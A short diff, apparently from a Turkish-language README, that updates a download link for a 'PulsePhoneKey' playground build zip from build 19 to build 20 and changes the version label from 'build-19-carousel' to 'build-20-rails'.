@@ -1,3 +1,3 @@
-Direkt: https://leadership-disabled-buyers-spaces.trycloudflare.com/downloads/PulsePhoneKey-playground-build19.zip  
+https://leadership-disabled-buyers-spaces.trycloudflare.com/downloads/PulsePhoneKey-playground-build20.zip  
 
-Sürüm: **`build-19-carousel`** — kayan menü: Trip / Lastik / Harita / Medya
+**`build-20-rails`**
